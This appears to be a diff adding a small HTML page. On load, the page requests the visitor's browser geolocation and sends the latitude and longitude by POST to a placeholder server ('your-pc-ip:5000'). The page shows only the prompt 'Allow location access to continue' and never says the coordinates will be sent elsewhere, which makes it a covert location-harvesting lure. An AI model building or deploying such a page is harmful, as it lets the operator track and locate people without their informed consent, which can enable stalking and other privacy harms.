@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Access</title>
+    <script>
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Send data to your server
+            fetch("http://your-pc-ip:5000/location", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ latitude, longitude })
+            })
+            .then(response => response.text())
+            .then(data => console.log("Location sent:", data))
+            .catch(error => console.error("Error:", error));
+        }
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, (error) => {
+                    console.error("Error getting location:", error);
+                });
+            } else {
+                alert("Geolocation is not supported by your browser.");
+            }
+        }
+    </script>
+</head>
+<body onload="requestLocation()">
+    <h2>Allow location access to continue</h2>
+</body>
+</html>
